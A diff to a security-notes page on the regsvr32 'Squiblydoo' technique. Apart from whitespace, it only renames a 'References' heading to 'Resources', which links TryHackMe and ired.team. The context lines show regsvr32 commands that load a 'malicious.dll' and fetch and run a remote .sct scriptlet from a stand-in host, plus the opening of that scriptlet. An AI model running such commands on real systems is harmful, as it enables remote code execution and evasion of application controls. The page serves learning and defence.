@@ -18,7 +18,8 @@ c:\Windows\System32\regsvr32.exe c:\Users\pwn\Downloads\malicious.dll
 c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\malicious.dll
 ```
 
-With the .sct file as: 
+With the .sct file as:
+
 ```bash
 #http://example.com/file.sct
 <?XML version="1.0"?>
@@ -39,7 +40,8 @@ The MITRE ATT\&CK framework refers to this technique as [Signed Binary Proxy Exe
 {% endtab %}
 {% endtabs %}
 
-## References
+## Resources
 
 {% embed url="https://tryhackme.com/room/livingofftheland" %}
+
 {% embed url="https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo" %}
